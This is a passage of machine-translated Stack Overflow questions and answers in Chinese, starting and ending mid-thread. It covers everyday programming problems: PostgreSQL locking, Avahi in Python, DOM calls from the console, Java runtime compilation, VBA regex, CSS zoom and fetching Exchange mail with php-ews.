总用时50.53，第三圈用时10.05（30.09-20.04）。所有单圈的总和应等于总时间。

现在，您可以轻松获得每圈的总时间和时间。假设这些值存储在一个数组中，您可以轻松做到：

```
- (void)startStopLap {
    // compute elapsed time...
    [self.times addObject:[NSNumber numberWithDouble:elapsedTime]];
}

- (double)totalTime {
    [[self.times lastObject] doubleValue]
        - [[self.times objectAtIndex:0] doubleValue];
}

- (double)timeForLap:(NSUInteger)lap {
    // Example assumes first lap is lap '1' and that you do
    // appropriate error checking...
    return [[self.times objectAtIndex:lap] doubleValue]
         - [[self.times objectAtIndex:lap-1] doubleValue];
} 
```

同样，您可以通过简单的减法获得前 N 圈的时间，并且您可以获得特定圈数范围（即第 2-4 圈）的时间。

希望这是有道理的，而且我没有太多的错别字没有编译器来检查......

# java - 如何通过 JDBC 锁定 PostgreSQL 数据库？

> ID：12300832
> 
> 赞同：4
> 
> 时间：2012-09-06T13:07:45.933
> 
> 标签：java, postgresql, jdbc, locking, postgresql-8.4

在我的 Java webapp 中，每个实例都在启动时检查数据库是否通过 JDBC 连接是最新的。如果数据库不是最新的，它会通过执行 SQL 脚本来执行更新例程。

我无法控制实例何时启动。因此，我需要确保只有一个实例同时执行数据库更新。理想情况下，我需要锁定整个数据库，但根据

[http://www.postgresql.org/docs/8.4/static/explicit-locking.html](http://www.postgresql.org/docs/8.4/static/explicit-locking.html)

和

[http://wiki.postgresql.org/wiki/Lock_database](http://wiki.postgresql.org/wiki/Lock_database)

PostgreSQL 不支持它（我仍在使用 8.4 版）。

我还有什么其他选择？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-06T13:46:49.763

如果您控制所有实例的代码，那么您可以在数据库中创建一个表，每个实例从该表开始，在该表中查找带有时间戳的记录。让我们称它为您的“锁定”记录。

如果进程发现锁记录不存在，则插入记录并处理您需要的数据。

如果一个进程发现锁记录确实存在，那么您可以假设另一个进程已经创建了它并且什么也不做，忙等待，或者其他什么。

通过这种设计，您可以有效地在数据库中创建一个“锁”来同步您的流程。您对其进行编码，因此所有进程都知道它们必须遵守锁定记录的逻辑。

一旦第一个拥有锁的进程完成处理，它应该清除锁记录，以便下一次重新启动正常运行。您还需要考虑由于服务器错误或执行错误导致锁没有被清除的情况。通常，如果锁超过`n`分钟，您可以认为它是“陈旧的”，因此删除它，然后再次创建它（或只是更新它）。

在处理“锁定”记录时，请务必在数据库连接上使用[Serializable](http://en.wikipedia.org/wiki/Isolation_%28database_systems%29#Serializable)隔离级别，以保证原子性。

Java 代码的*服务层可以在调用**数据访问*层之前执行锁定策略。是否使用 Hibernate 无关紧要，因为它只是应用程序逻辑。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:46:50.907

> 理想情况下，我需要锁定整个数据库。

只要您有效地序列化访问，您的锁适用于什么真的很重要吗？只需在任何表或行上获取排他锁即可。

# python - 无法让 Avahi.ServiceResolver 工作

> ID：12300836
> 
> 赞同：1
> 
> 时间：2012-09-06T13:07:53.423
> 
> 标签：python, pygobject, gobject, avahi

我正在尝试将当前使用 Avahi 原始 dbus 接口的一些代码移植到使用 Avahi gobject 接口（通过 python 的 gobject 自省）。

我得到了 ServiceBrowser，但我无法让 ServiceResolver 工作。这是我的代码：

```
#!/usr/bin/env python

import logging

from gi.repository import Avahi

logging.basicConfig(level=logging.DEBUG)
ac_log = logging.getLogger('Avahi.Client')
sb_log = logging.getLogger('Avahi.ServiceBrowser')
sr_log = logging.getLogger('Avahi.ServiceResolver')

def ac_state_changed(client, state):
    ac_log.debug('state_changed: {}'.format(state))

avahi_client = Avahi.Client(flags=0,)
avahi_client.connect('state-changed', ac_state_changed)
avahi_client.start()

def sb_new_service(browser, interface, protocol, name, type, domain, flags ):
    sb_log.debug('new: {}'.format(name))
    if not (flags & Avahi.LookupResultFlags.GA_LOOKUP_RESULT_LOCAL):
        sb_log.debug('resolving: {}'.format(name))
        service_resolver = Avahi.ServiceResolver(
            interface=interface,
            protocol=protocol,
            name=name,
            type=type,
            domain=domain,
            aprotocol=Avahi.Protocol.GA_PROTOCOL_UNSPEC,
            flags=0,)
        service_resolver.connect('found', sr_found)
        service_resolver.connect('failure', sr_failure)
        service_resolver.attach(avahi_client)

def sb_all_for_now(*args):
    sb_log.debug('all_for_now')
    seen_all = True

def sb_failure(*args):
    sb_log.error('failure: {}'.format(args))

def sr_found(*args):
    sr_log.debug('found: {}'.format(args))

def sr_failure(*args):
    sr_log.error('failure: {}'.format(args))

service_browser = Avahi.ServiceBrowser(
    domain='local',
    flags=0,
    interface=-1,
    protocol=Avahi.Protocol.GA_PROTOCOL_UNSPEC,
    type='_workstation._tcp')

service_browser.connect("new_service", sb_new_service)
service_browser.connect("failure", sb_failure)
service_browser.attach(avahi_client)

from gi.repository import GObject

mainloop = GObject.MainLoop()
mainloop.run() 
```

示例输出：

```
DEBUG:Avahi.Client:state_changed: <enum GA_CLIENT_STATE_S_RUNNING of type GaClientState>
DEBUG:Avahi.ServiceBrowser:new: Mobi [d8:d3:85:e8:26:3d]
DEBUG:Avahi.ServiceBrowser:resolving: Mobi [d8:d3:85:e8:26:3d]
DEBUG:Avahi.ServiceBrowser:new: garyvdm [00:1d:09:a5:10:54]
DEBUG:Avahi.ServiceBrowser:new: noddy [00:15:c5:c6:46:4b]
DEBUG:Avahi.ServiceBrowser:resolving: noddy [00:15:c5:c6:46:4b]
DEBUG:Avahi.ServiceBrowser:new: crack [00:1c:26:20:e0:1d]
DEBUG:Avahi.ServiceBrowser:resolving: crack [00:1c:26:20:e0:1d]
DEBUG:Avahi.ServiceBrowser:new: opium [00:1d:09:c1:ed:cf]
DEBUG:Avahi.ServiceBrowser:resolving: opium [00:1d:09:c1:ed:cf]
DEBUG:Avahi.ServiceBrowser:new: gerard-vm [00:0c:29:d0:2a:af]
DEBUG:Avahi.ServiceBrowser:resolving: gerard-vm [00:0c:29:d0:2a:af]
DEBUG:Avahi.ServiceBrowser:all_for_now
^CTraceback (most recent call last):
  File "pacshare/xfer.py", line 65, in <module>
    mainloop.run()
KeyboardInterrupt 
```

在按下 ctrl-c 之前，我让它运行了大约 1 分钟。如您所见，我正在调用 ServiceResolver，但从未调用 sr_found 和 sr_failure 方法。我怎样才能让它工作？

[（我在http://code.ohloh.net/](http://code.ohloh.net/)上找不到任何其他代码，所以我怀疑我可能是第一个尝试这样做的人）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-28T13:09:14.810

基本上你的代码工作得很好。它唯一的问题是[引用计数](http://docs.python.org/2/extending/extending.html#reference-counts)。

当python解释器到达末尾时`sb_new_service()`，它将删除所有不再被引用的对象。由于您已指定`service_resolver`为局部变量，因此该对象也将被删除。为了防止这种情况发生，您可以`service_resolver`像这样添加到解析器的（全局）列表中：

```
resolvers = []

def sb_new_service(browser, interface, protocol, name, type, domain, flags ):
    sb_log.debug('new: {}'.format(name))
    if not (flags & Avahi.LookupResultFlags.GA_LOOKUP_RESULT_LOCAL):
        sb_log.debug('resolving: {}'.format(name))
        service_resolver = Avahi.ServiceResolver(
            interface=interface,
            protocol=protocol,
            name=name,
            type=type,
            domain=domain,
            aprotocol=Avahi.Protocol.GA_PROTOCOL_UNSPEC,
            flags=0,)
        service_resolver.connect('found', sr_found)
        service_resolver.connect('failure', sr_failure)
        service_resolver.attach(avahi_client)
        global resolvers
        resolvers.append(service_resolver) 
```

那么你的代码应该可以正常工作。

# javascript - Web 控制台命令不起作用

> ID：12300838
> 
> 赞同：0
> 
> 时间：2012-09-06T13:07:54.683
> 
> 标签：javascript, html, debugging, console

我正在尝试将 Web 开发人员工具“Web Console”与“Firebug”一起使用。我试图通过在 web 控制台中输入脚本来模拟单击此按钮时发生的情况，但它不起作用。有人可以帮我弄清楚在 Web 控制台中输入的内容吗？我向老板寻求帮助，但他说这是最后一根稻草！！请帮忙。

这是带有按钮的代码....

```
<div id="car_perf_internal" style="display: inline;">
  <span style="float:left;"> </span>
  <div class="select_box right nccDropToggleSection">
    <a id="Left" class="NCCPUSHBUTTON" href="javascript:;" onclick="iToggleDisplay(this, 'nccDropToggleSection', 'nccDropToggleContent', null, null, 2);">
  <span>
<input id="buttons_K_NC_TITLE" class="NCCPUSHBUTTON" type="button" value="Performance Documents" name="buttons_K_NC_TITLE">
</span>
</a> 
```

我尝试将其输入 Web 控制台，但它显示“TypeError：a 未定义”

```
iToggleDisplay('Left', 'nccDropToggleSection', 'nccDropToggleContent', null, null, 2); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T13:10:14.170

`Left`不是 dom 元素，它是 ID 值。您需要将其转换为元素：

```
iToggleDisplay(document.getElementById('Left'), 'nccDropToggleSection', 'nccDropToggleContent', null, null, 2); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:12:01.570

您必须传递实际`DOM`节点而不是`id`作为第一个参数

所以而不是

```
iToggleDisplay('Left', 'nccDropToggleSection', 'nccDropToggleContent', null, null, 2); 
```

它应该是

```
iToggleDisplay(document.getElementById('Left'), 'nccDropToggleSection', 'nccDropToggleContent', null, null, 2); 
```

因为`this`是指节点本身

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-06T13:09:59.477

看来您需要传递对元素的引用，而不仅仅是 id。

```
iToggleDisplay(document.getElementById('Left'), 'nccDropToggleSection', 'nccDropToggleContent', null, null, 2); 
```

另一种选择是调用点击

```
var elem = document.getElementById("Left");
elem.onclick.apply(elem); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-06T13:10:27.883

如果您在 html 中的 event 属性中放置一些代码，则`this`指向 dom 对象（在您的情况下指向带有 id 的链接`Left`）。要得到这个，你可以通过 id 和`document.getElementById`函数得到它：

```
iToggleDisplay(document.getElementById('Left'), 'nccDropToggleSection', 'nccDropToggleContent', null, null, 2); 
```

但是您可以通过这种方式模拟按钮单击：

```
document.getElementById('Left').click(); 
```

# visual-studio-2010 - vs 2010 中不可用的项目？

> ID：12300839
> 
> 赞同：9
> 
> 时间：2012-09-06T13:07:55.670
> 
> 标签：visual-studio-2010

*不可用或可用*（已加载）项目/网站的*指示*保存在哪里？

 *我有一个解决方案，其中有一些未加载的项目，而*仅*加载了网站

当然，我可以右键单击并*重新加载它，*但我*仍然*想现在*将*这个 [不可用或可用] 信息保存在哪里？

![在此处输入图像描述](../Images/ea784e36d64d1c8825d1ff77bc63a7e8.png)

我一直在寻找，`sln`加载一个和卸载一个之间没有区别（除了比较之外）。

同样在`Websites.xml`，没有这样的区别

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-06T13:15:47.367

suo 文件代表“解决方案用户对象”（这是一个猜测）。

它是解决方案设置的每个用户容器。

你可以安全地删除它，但是你会丢失一些其他不重要的东西，比如断点等等。

在大多数 VCS 中，此文件位于标准排除列表中，因为它应该针对每个用户保持特定。这是您可以安全删除它的证据。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-06T13:36:12.720

我相信有关解决方案中已加载和不可用项目的信息存储在 .suo 文件中。如前所述，这是一个用户特定的二进制设置文件，由 Visual Studio 自动生成和维护。

值得指出的是，如果机器没有安装相关软件，某些项目将无法加载（例如，[MVC Web 应用程序项目](http://www.asp.net/mvc)不会在没有安装它的机器上加载；[WIX 项目](http://wix.sourceforge.net/)类似）。

如果您有意卸载项目以改善解决方案的整体加载时间，那么您应该知道[Visual Studio 2012 现在支持异步加载项目](http://msdn.microsoft.com/library/bb386063%28v=vs.110%29#BKMK_IDEProjects)。

您可能还会考虑将一些项目拆分为其他解决方案，按主要系统功能进行分组（小心破坏项目依赖关系。）*

# dotnetnuke - DNN 6.0 中的动态页面

> ID：12300840
> 
> 赞同：0
> 
> 时间：2012-09-06T13:07:59.633
> 
> 标签：dotnetnuke, dotnetnuke-5, dotnetnuke-module

我在 DNN 中创建了一个动态页面。所以我想知道当我关闭正在运行的应用程序时，我可以从哪里找到代码端的这个页面。例如，我创建了一个可以在 DesktopModule 下找到的模块。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-09T17:06:44.823

如果您要查找的内容，DNN 不会在磁盘上为每个页面创建文件。一个页面的所有数据都在数据库中的选项卡和相关表中。

# objective-c - /var/log/syslog 在 iOS 中等效？

> ID：12300845
> 
> 赞同：1
> 
> 时间：2012-09-06T13:08:29.193
> 
> 标签：objective-c, ios, cocoa-touch

我是 iPhone/iOS 环境的新手，在 Mac 上我可以看到像 /var/log/system.log 这样的系统日志，当然也可以在 linux /var/log/syslog 中看到。

如何在 iPhone 上查看相同的日志文件？但首先，这可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T13:14:28.880

你打开 xcode，去 Organizer (CMD + SHIFT + 2)，你可以在你的 iphone 下看到设备日志。在那里，您可以可视化您使用的每个应用程序的所有日志。

# java - 如何编译通过网页提交的java代码

> ID：12300847
> 
> 赞同：2
> 
> 时间：2012-09-06T13:08:37.300
> 
> 标签：java

我想为我最后一年的项目制作一个 Java 教程网站。该网站会问用户一个问题，然后他们会将 java 代码写入一个表单。

我想不通的是如何编译已经提交的代码。我应该用 PHP 编写自己的测试用例，还是有办法让 java 编译器在像 hostmonster 这样的网络主机上运行？欢迎任何建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T13:13:07.203

看看[JavaCompiler](http://docs.oracle.com/javase/7/docs/api/javax/tools/JavaCompiler.html)类：

```
import java.lang.reflect.Method;
import java.net.URI;
import java.util.Iterator;
import java.util.NoSuchElementException;

import javax.tools.JavaCompiler;
import javax.tools.JavaFileObject;
import javax.tools.SimpleJavaFileObject;
import javax.tools.ToolProvider;

public class CompileString {
  public static void main(String[] args) throws Exception {
    JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
    String program = "class Test{" + "   public static void main (String [] args){"
        + "      System.out.println (\"Hello, World\");"
        + "      System.out.println (args.length);" + "   }" + "}";

    Iterable<? extends JavaFileObject> fileObjects;
    fileObjects = getJavaSourceFromString(program);

    compiler.getTask(null, null, null, null, null, fileObjects).call();

    Class<?> clazz = Class.forName("Test");
    Method m = clazz.getMethod("main", new Class[] { String[].class });
    Object[] _args = new Object[] { new String[0] };
    m.invoke(null, _args);
  }

  static Iterable<JavaSourceFromString> getJavaSourceFromString(String code) {
    final JavaSourceFromString jsfs;
    jsfs = new JavaSourceFromString("code", code);
    return new Iterable<JavaSourceFromString>() {
      public Iterator<JavaSourceFromString> iterator() {
        return new Iterator<JavaSourceFromString>() {
          boolean isNext = true;

          public boolean hasNext() {
            return isNext;
          }

          public JavaSourceFromString next() {
            if (!isNext)
              throw new NoSuchElementException();
            isNext = false;
            return jsfs;
          }

          public void remove() {
            throw new UnsupportedOperationException();
          }
        };
      }
    };
  }
}

class JavaSourceFromString extends SimpleJavaFileObject {
  final String code;

  JavaSourceFromString(String name, String code) {
    super(URI.create("string:///" + name.replace('.', '/') + Kind.SOURCE.extension), Kind.SOURCE);
    this.code = code;
  }

  public CharSequence getCharContent(boolean ignoreEncodingErrors) {
    return code;
  }
} 
```

上面编译了一个`String`包含 Java 源并执行它以了解更多信息：[JavaCompiler Turorials - Java2s](http://www.java2s.com/Tutorial/Java/0120__Development/0800__Java-Compiler.htm)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T13:11:34.530

您需要在一台运行 Java 的机器上才能编译或运行它。一旦你有了，你可以使用命令行。

注意：您应该采取一些基本步骤来确保该程序不会被轻易地用来破解系统，例如可以禁用 Runtime.exec()。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-06T13:11:26.527

您可以使用[Java Compiler](http://docs.oracle.com/javase/6/docs/api/javax/tools/JavaCompiler.html)即时编译类

是的，建议您需要一台安装了 Java 的机器，主要是您的服务器。

# regex - vba 正则表达式仅返回第一个匹配项

> ID：12300848
> 
> 赞同：8
> 
> 时间：2012-09-06T13:08:39.117
> 
> 标签：regex, vba

我在 VBA (WORD) 中的正则表达式匹配只给出一个结果。

我创建了这个功能

```
Function RE6(strData As String) As String

    Dim RE As Object, REMatches As Object
    Set RE = CreateObject("vbscript.regexp")
    With RE
        .MultiLine = False
        .Global = False
        .IgnoreCase = True
        .Pattern = "\[substep [a-zA-Z]\](.*?); {1}"
    End With

    Set REMatches = RE.Execute(strData)

    RE6 = ""

End Function 
```

这里的问题是它只给出第一个结果。例如我得到一个字符串：

```
[step 1] title for substeps;  [substep a] step a; [substep b] step b; [substep c] step c; 
```

我的结果是：

【子步骤a】步骤a；

只有 1 个匹配，而不是步骤 b 和 c。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-09-06T13:29:35.737

您需要将 Global 设置为 True

[http://msdn.microsoft.com/en-us/library/tdte5kwf%28v=vs.84%29](http://msdn.microsoft.com/en-us/library/tdte5kwf%28v=vs.84%29)

# css - CSS布局缩放问题

> ID：12300851
> 
> 赞同：2
> 
> 时间：2012-09-06T13:08:44.360
> 
> 标签：css, zooming

我的问题是，当我放大或缩小页面时（在我尝试过的所有浏览器中），只有部分页面显示为缩放（div 中的内容，而不是 div 本身）。我把边框很容易显示出来。

当我搜索解决方案时，他们都提到这是因为使用像素（px）固定宽度值。因此，我`%`在将值设置为宽度和高度时使用；但是，问题仍然存在……

**以下是一些截图来说明我的问题：**

**放大时：**

![放大的](../Images/e567eeb6d6bf4e2246d63c713124cc99.png)

**缩小时：**

![缩小](../Images/ea078de720cf6832b7be12ce54403232.png)

**这是我的代码：**

**HTML：**

```
<html>
    <head>
        <link href="style.css" type="text/css" rel="stylesheet"/>
    </head>
    <body>
        <div id="title_bar">
            some txt here
            <div id="title_img"></div>

            <div id="title_txt"></div>

            <div id="menu_navigation"></div>
        </div>

        <div id="title_bar_2">
            some txt here
        </div>

        <div id="container_columns">
            <div id="column_1">
                <span id="column_1_content">some txt here</span>
            </div>
            <div id="column_2">
                <span id="column_2_content">some txt here</span>
            </div>
        </div>
    </body>
</html> 
```

**CSS：**

```
html body
{
    margin: 0;
    width: 100%;
    height: 100%;
    background-color:#f2f2f2;
}

div#title_bar
{
    height:4%;
    width:76%;
    margin:auto;
    margin-top:4%;
    border-style:solid;
    border-color:blue;
}

div#title_bar_2
{
    text-align:center;
    height:44%;
    width:76%;
    margin:auto;
    margin-top:2%;
    border-style:solid;
    border-color:blue;
}

div#title_bar img
{
    margin-top:1%;
    float:left;
}

div#title_txt
{
    float:left;
    margin-left:2%;
    margin-top:1.4%;
    font-style: italic;
    font-family:verdana;
    font-size: 16px;
}

div#menu_navigation
{
    float:left;
    margin-left:35%;
    margin-top:1.4%;
    font-size:19px;
}

div#container_columns
{
    margin:auto;
    width:76.5%;
    margin-top:2%;
    height:27%;
    border-style:solid;
    border-color:blue;
}

div#column_1
{
    height:100%;
    width:49%;
    float:left;
    border-style:solid;
    border-color:blue;
}

div#column_2
{
    margin-left:1%;
    width:48%;
    float:left;
    height:100%;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T13:38:06.137

嗨，这是因为您正在使用属性高度。如果你想要这个属性，尽量不要使用它。

```
html body{
margin: 0;
width: 100%;
background-color:#f2f2f2;}

div#title_bar{
width:76%;
margin:auto;
margin-top:4%;
border-style:solid;
border-color:blue;}

div#title_bar_2{
text-align:center;
width:76%;
margin:auto;
margin-top:2%;
border-style:solid;
border-color:blue;}

div#title_bar img{
margin-top:1%;
float:left;}

div#title_txt{
float:left;
margin-left:2%;
margin-top:1.4%;
font-style: italic;
font-family:verdana;
font-size: 16px;}

div#menu_navigation{
float:left;
margin-left:35%;
margin-top:1.4%;
font-size:19px;}

div#container_columns{
margin:auto;
width:76.5%;
margin-top:2%;
border-style:solid;
border-color:blue;
display:block;}

div#column_1{
width:48%;
float:left;
border-style:solid;
border-color:blue;}

div#column_2{
margin-left:1%;
width:48%;
float:left;} 
```

# data-structures - 什么是阴影阵列

> ID：12300854
> 
> 赞同：9
> 
> 时间：2012-09-06T13:08:49.540
> 
> 标签：data-structures, compiler-optimization

什么是影子数组，它是如何实现的？我在阅读有关编译器优化的信息时遇到了这个术语，但我找不到任何关于它的实质性参考。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2014-07-09T01:43:53.720

当使用数组来实现动态调整大小的抽象数据类型时，例如 List、Queue 或 Stack，遇到的一个明显问题是数组本身不能自由调整大小。那么，在某个时候，如果向数组添加足够多的项，最终将耗尽空间。

这个问题的简单解决方案是等到正在使用的数组空间不足，然后创建一个新的更大的数组，将旧数组中的所有项目复制到新数组中，然后开始使用新数组。

使用抽象数据类型实现的影子数组是对此的替代方案。与其等到旧数组已满，不如在正在使用的数组上传递某个满度阈值后创建第二个更大的数组。此后，随着项目被添加到旧数组中，多个项目从旧数组复制到影子数组，这样当旧数组已满时，它的所有项目都已经复制到新数组中。

使用影子数组实现而不是天真的“在最后复制所有内容”方法的优点是每个添加操作所需的时间更加一致。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-06T13:19:49.693

我认为它是一种动态数组的形式。

阴影一词指的是试图以良好的性能调整其大小但隐藏在简单界面后面的底层算法。（例如 Java 中的 ArrayList）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-06T13:28:02.843

这是[你](http://pages.cs.wisc.edu/~bart/537/lecturenotes/s17.html)要找的吗？（滚动到底部。）

# javascript - Javascript：使用 document.write 时删除子级

> ID：12300861
> 
> 赞同：0
> 
> 时间：2012-09-06T13:09:10.787
> 
> 标签：javascript

我想要这样的东西：

```
var abc1 = document.write('<html>HTMLPAGECONTENTHERE</html>');

function removepage(){
abc1.parentNode.removeChild(abc1);
}

removepage(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:10:30.677

那是行不通的；`document.write`不返回任何东西。

您应该改用 DOM API (`createElement()`和`appendChild()`)，或者更容易使用 jQuery。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:11:26.717

`document.write`将 HTML 流直接插入页面。它没有有用的返回值。

如果你想通过 DOM 操作它输出的内容，那么你必须有一个已知的数量来匹配`getElementById`，`getElementsByTagName`或者其他一些从 DOM 获取 HTML 元素节点的方法。

# php - PHP 和 Exchange Web 服务：使用 php-ews 获取消息正文

> ID：12300863
> 
> 赞同：1
> 
> 时间：2012-09-06T13:09:34.080
> 
> 标签：php, email, message, exchangewebservices

我没有运气使用 php-ews 从 Exchange 2010 服务器获取电子邮件的消息正文。这是我的代码：

```
$ews = new ExchangeWebServices("hostname", "username","password",ExchangeWebServices::VERSION_2010);

$request = new EWSType_FindItemType();

$itemProperties = new EWSType_ItemResponseShapeType();

$itemProperties->BaseShape = EWSType_DefaultShapeNamesType::ALL_PROPERTIES;
$itemProperties->BodyType = EWSType_BodyTypeResponseType::BEST;

$request->ItemShape = $itemProperties;

//If I do not include the below three sentences I get a PHP Fatal error saying "Basepoint" not found

$request->IndexedPageItemView = new EWSType_IndexedPageViewType();
$request->IndexedPageItemView->BasePoint = 'Beginning';

$request->IndexedPageItemView->Offset = 0;

$request->ParentFolderIds = new EWSType_NonEmptyArrayOfBaseFolderIdsType();
$request->ParentFolderIds->DistinguishedFolderId = new EWSType_DistinguishedFolderIdType();
$request->ParentFolderIds->DistinguishedFolderId->Id = EWSType_DistinguishedFolderIdNameType::INBOX;

$request->Traversal = EWSType_ItemQueryTraversalType::SHALLOW;

$result = new EWSType_FindItemResponseMessageType();

$result = $ews->FindItem($request);
if ($result->ResponseMessages->FindItemResponseMessage->ResponseCode == 'NoError' && $result->ResponseMessages->FindItemResponseMessage->ResponseClass == 'Success'){

    $message = $result->ResponseMessages->FindItemResponseMessage->Items->Message;
        //This if loop is entered but the $message variable contains nothing
    print_r($message);exit;
    //var_dump($message) displays NULL
} 
```

进入“if”循环，但 $message 变量不包含任何内容。通常它应该是一个对象，我可以从中检索电子邮件的正文。

我究竟做错了什么 ？

我在 if() 语句中尝试了这个，我得到了 $message 对象：

```
$message = $result->ResponseMessages->FindItemResponseMessage->RootFolder->Items->Message;
print_r($message);exit; 
```

缺少“RootFolder”属性。但是，生成的 $message 变量不包含任何包含电子邮件正文的“正文”属性。这就是 print_r($message) 的样子：

```
stdClass Object 
```

( [ItemId] => stdClass Object ( [Id] => AAMkADZjOTZhNjNkLTBmZTAtNDdkZi04NGI5LTdiZWY0ZWYzOGNhMwBGAAAAAABI9LX/rIDdRr5XMdDM8RGZBwAL3uOTQAYYQ4U8CTQP/+wKAAAAWsnbAAAL3uOTQAYYQ4U8CTQP/+wKAAAAWvd0AAA= [ChangeKey] => CQAAABYAAAAL3uOTQAYYQ4U8CTQP/+wKAAAAWyCi )

```
[ParentFolderId] => stdClass Object
    (
        [Id] => AQMkADZjOTZhNjNkLTBmZTAtNDdkZi04NGI5LTdiZWY0ZWYzOGNhMwAuAAADSPS1/6yA3Ua+VzHQzPERmQEAC97jk0AGGEOFPAk0D//sCgAAAVrJ2wAAAA==
        [ChangeKey] => AQAAAA==
    )

[ItemClass] => IPM.Note
[Subject] => Test
[Sensitivity] => Normal
[DateTimeReceived] => 2012-09-05T13:03:08Z
[Size] => 4754
[Importance] => Normal
[IsSubmitted] => 
[IsDraft] => 
[IsFromMe] => 
[IsResend] => 
[IsUnmodified] => 1
[DateTimeSent] => 2012-09-05T13:03:00Z
[DateTimeCreated] => 2012-09-05T13:03:08Z
[DisplayCc] => 
[DisplayTo] => sara cooper
[HasAttachments] => 
[Culture] => en-IN
[EffectiveRights] => stdClass Object
    (
        [CreateAssociated] => 
        [CreateContents] => 
        [CreateHierarchy] => 
        [Delete] => 1
        [Modify] => 1
        [Read] => 1
    )

[LastModifiedName] => Lin T
[LastModifiedTime] => 2012-09-05T13:03:08Z
[IsAssociated] => 
[WebClientReadFormQueryString] => ?ae=Item&a=Open&t=IPM.Note&id=RgAAAABI9LX%2frIDdRr5XMdDM8RGZBwAL3uOTQAYYQ4U8CTQP%2f%2bwKAAAAWsnbAAAL3uOTQAYYQ4U8CTQP%2f%2bwKAAAAWvd0AAAJ&exvsurl=1
[ConversationId] => stdClass Object
    (
        [Id] => AAQkADZjOTZhNjNkLTBmZTAtNDdkZi04NGI5LTdiZWY0ZWYzOGNhMwAQAJ56TrE0QUIAk59ALIqWrrY=
    )

[Sender] => stdClass Object
    (
        [Mailbox] => stdClass Object
            (
                [Name] => Lin T
                [MailboxType] => OneOff
            )

    )

[IsReadReceiptRequested] => 
[ConversationIndex] => Í‹fÃIžzN±4AB“Ÿ@,Š–®¶
[ConversationTopic] => Test
[From] => stdClass Object
    (
        [Mailbox] => stdClass Object
            (
                [Name] => Lin T
                [MailboxType] => OneOff
            )

    )

[InternetMessageId] => <027d01cd8b66$c8c967e0$5a5c37a0$@marlabs.com>
[IsRead] => 
[ReceivedBy] => stdClass Object
    (
        [Mailbox] => stdClass Object
            (
                [Name] => sara cooper
                [MailboxType] => OneOff
            )

    )

[ReceivedRepresenting] => stdClass Object
    (
        [Mailbox] => stdClass Object
            (
                [Name] => sara cooper
                [MailboxType] => OneOff
            )

    ) 
```

)

我还需要发件人和收件人的电子邮件地址。这里只显示名字和姓氏。请帮助这变得非常紧迫。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-10T12:44:00.720

我终于让它工作了！以下是从 Exchange 2010 Server 检索未读电子邮件的方法：

```
 $ews = new ExchangeWebServices("hostname", "username", "password",ExchangeWebServices::VERSION_2010);

$request = new EWSType_FindItemType();
$itemProperties = new EWSType_ItemResponseShapeType();
$itemProperties->BaseShape = EWSType_DefaultShapeNamesType::ID_ONLY;
$itemProperties->BodyType = EWSType_BodyTypeResponseType::BEST;
$request->ItemShape = $itemProperties;

$fieldType = new EWSType_PathToUnindexedFieldType();
$fieldType->FieldURI = 'message:IsRead';

$constant = new EWSType_FieldURIOrConstantType();
$constant->Constant = new EWSType_ConstantValueType();
$constant->Constant->Value = "0";

$IsEqTo = new EWSType_IsEqualToType();
$IsEqTo->FieldURIOrConstant = $constant;
$IsEqTo->Path = $fieldType;

$request->Restriction = new EWSType_RestrictionType();
$request->Restriction->IsEqualTo = new EWSType_IsEqualToType();
$request->Restriction->IsEqualTo->FieldURI = $fieldType;
$request->Restriction->IsEqualTo->FieldURIOrConstant = $constant;

$request->IndexedPageItemView = new EWSType_IndexedPageViewType();
$request->IndexedPageItemView->BasePoint = 'Beginning';
$request->IndexedPageItemView->Offset = 0;

$request->ParentFolderIds = new EWSType_NonEmptyArrayOfBaseFolderIdsType();
$request->ParentFolderIds->DistinguishedFolderId = new EWSType_DistinguishedFolderIdType();
$request->ParentFolderIds->DistinguishedFolderId->Id = EWSType_DistinguishedFolderIdNameType::INBOX;

$request->Traversal = EWSType_ItemQueryTraversalType::SHALLOW;

$result = new EWSType_FindItemResponseMessageType();
$result = $ews->FindItem($request);
/*echo '<pre>';
print_r($result);exit;*/
if ($result->ResponseMessages->FindItemResponseMessage->ResponseCode == 'NoError' && $result->ResponseMessages->FindItemResponseMessage->ResponseClass == 'Success'){
    $count = $result->ResponseMessages->FindItemResponseMessage->RootFolder->TotalItemsInView;
    for ($i = 0; $i < $count; $i++){
        $message_id = $result->ResponseMessages->FindItemResponseMessage->RootFolder->Items->Message[$i]->ItemId->Id;
        $request = new EWSType_GetItemType();

        $request->ItemShape = new EWSType_ItemResponseShapeType();
        $request->ItemShape->BaseShape = EWSType_DefaultShapeNamesType::ALL_PROPERTIES;

        $request->ItemIds = new EWSType_NonEmptyArrayOfBaseItemIdsType();
        $request->ItemIds->ItemId = new EWSType_ItemIdType();
        $request->ItemIds->ItemId->Id = $message_id; 

        $response = $ews->GetItem($request);
        //print_r($response);exit;
        if( $response->ResponseMessages->GetItemResponseMessage->ResponseCode == 'NoError' &&
            $response->ResponseMessages->GetItemResponseMessage->ResponseClass == 'Success' ) {

            $message = $response->ResponseMessages->GetItemResponseMessage->Items->Message;

